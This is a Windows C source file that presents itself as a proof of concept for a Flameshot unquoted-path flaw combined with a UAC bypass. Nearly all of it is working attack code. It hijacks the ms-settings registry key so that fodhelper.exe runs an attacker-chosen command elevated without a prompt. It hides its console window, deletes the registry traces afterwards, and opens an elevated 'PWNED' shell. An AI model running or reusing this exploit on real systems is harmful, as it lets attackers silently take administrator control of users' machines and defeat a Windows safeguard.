#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define LOG_FILE "C:\\Windows\\Temp\\flameshot_silent_elevate.txt"

FILE* g_log = NULL;

void log_write(const char* fmt, ...)
{
    if (!g_log) return;
    va_list args;
    va_start(args, fmt);
    vfprintf(g_log, fmt, args);
    va_end(args);
    fflush(g_log);
}

void cleanup_fodhelper_registry(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "DelegateExecute");
        RegCloseKey(hKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
}

BOOL bypass_uac_fodhelper(const char* payload_cmd)
{
    HKEY hKey;
    DWORD disp;
    LONG res;

    cleanup_fodhelper_registry();

    res = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &disp);
    if (res != ERROR_SUCCESS) {
        log_write("[-] RegCreateKeyExA failed: %ld\n", res);
        return FALSE;
    }

    res = RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)payload_cmd, (DWORD)strlen(payload_cmd) + 1);
    if (res != ERROR_SUCCESS) {
        log_write("[-] RegSetValueExA failed: %ld\n", res);
        RegCloseKey(hKey);
        return FALSE;
    }

    res = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
        (const BYTE*)"", 1);
    if (res != ERROR_SUCCESS) {
        log_write("[-] RegSetValueExA (DelegateExecute) failed: %ld\n", res);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    log_write("[+] Registry hijack set successfully\n");
    log_write("    Command: %s\n", payload_cmd);

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "open";
    sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NO_CONSOLE;

    if (!ShellExecuteExA(&sei)) {
        log_write("[-] ShellExecuteExA(fodhelper) failed: %lu\n", GetLastError());
        return FALSE;
    }

    log_write("[+] fodhelper.exe launched. UAC bypass in progress...\n");
    Sleep(3000);

    cleanup_fodhelper_registry();
    log_write("[*] Registry cleaned up.\n");

    return TRUE;
}

BOOL is_process_elevated(void)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_ELEVATION elevation = {0};
    DWORD dwSize = 0;
    BOOL elevated = FALSE;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        elevated = elevation.TokenIsElevated;
    }
    CloseHandle(hToken);
    return elevated;
}

void get_current_user_info(void)
{
    char username[256] = {0};
    DWORD len = sizeof(username);
    GetUserNameA(username, &len);
    log_write("[+] Current User: %s\n", username);
}

void get_integrity_level(void)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return;
    DWORD dwLength = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) { CloseHandle(hToken); return; }
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)HeapAlloc(GetProcessHeap(), 0, dwLength);
    if (!pTIL) { CloseHandle(hToken); return; }
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {
        DWORD rid = *GetSidSubAuthority(pTIL->Label.Sid, 0);
        const char* level = "Unknown";
        if (rid < SECURITY_MANDATORY_LOW_RID) level = "Untrusted";
        else if (rid < SECURITY_MANDATORY_MEDIUM_RID) level = "Low";
        else if (rid < SECURITY_MANDATORY_HIGH_RID) level = "Medium";
        else if (rid < SECURITY_MANDATORY_SYSTEM_RID) level = "High";
        else level = "System";
        log_write("[+] Integrity Level RID: %lu (%s)\n", rid, level);
    }
    HeapFree(GetProcessHeap(), 0, pTIL);
    CloseHandle(hToken);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    g_log = fopen(LOG_FILE, "a");
    if (!g_log) g_log = fopen("C:\\Users\\Public\\flameshot_silent_elevate.txt", "a");
    if (!g_log) return 1;

    log_write("\n========================================\n");
    log_write("Flameshot Unquoted Path + UAC Bypass PoC\n");
    log_write("========================================\n\n");

    get_current_user_info();

    BOOL alreadyElevated = is_process_elevated();
    log_write("[+] TokenIsElevated at entry: %s\n", alreadyElevated ? "TRUE" : "FALSE");
    get_integrity_level();

    if (alreadyElevated) {
        log_write("[*] Already elevated. Spawning cmd directly...\n");
        ShellExecuteA(NULL, "open", "cmd.exe",
            "/k echo ALREADY ELEVATED & whoami /groups & title PWNED & pause",
            NULL, SW_SHOW);
    } else {
        log_write("[*] Not elevated. Performing fodhelper UAC bypass...\n");

        const char* elevated_cmd =
            "cmd.exe /k echo SILENT ELEVATION SUCCESSFUL & whoami /groups & title PWNED & pause";

        if (bypass_uac_fodhelper(elevated_cmd)) {
            log_write("[+] UAC bypass completed. Check for elevated cmd window.\n");
        } else {
            log_write("[-] UAC bypass failed. Falling back to runas prompt...\n");
            ShellExecuteA(NULL, "runas", "cmd.exe",
                "/k echo Fallback: click YES for elevation & whoami /groups & pause",
                NULL, SW_SHOW);
        }
    }

    log_write("[*] Log saved to: %s\n", LOG_FILE);
    log_write("========================================\n\n");
    fclose(g_log);
    return 0;
}
